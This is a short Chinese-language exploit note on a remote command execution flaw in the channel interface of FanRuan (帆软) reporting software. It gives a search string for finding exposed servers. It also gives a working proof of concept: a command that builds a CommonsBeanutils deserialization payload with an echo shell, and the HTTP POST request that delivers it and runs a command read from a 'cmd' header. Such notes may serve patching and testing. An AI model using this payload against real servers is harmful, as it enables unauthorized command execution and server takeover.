# 帆软报表 channel 远程命令执行漏洞

## 漏洞描述

帆软报表 channel 接口存在远程命令执行漏洞, 攻击者通过漏洞可以获取服务器权限，攻击服务器

## 漏洞影响

帆软报表</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"Powered by 帆软"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1685439448593-9afc647d-ba30-452c-928e-9a6a49c04edd.png)

验证POC

```php
java -jar ysuserial-1.5-su18-all.jar -g CommonsBeanutils1183NOCC -p 'EX-TomcatEcho' -ch "cmd" > fine10.bin

POST /webroot/decision/remote/design/channel HTTP/1.1
Content-Type: application/json
Host: 
cmd: id
Connection: close

{{gzip(file(fine10.bin))}}
```

![img](../../../.vuepress/public/img/1685439538732-8dee3451-21ea-427e-9f75-6ba5c29e3567.png)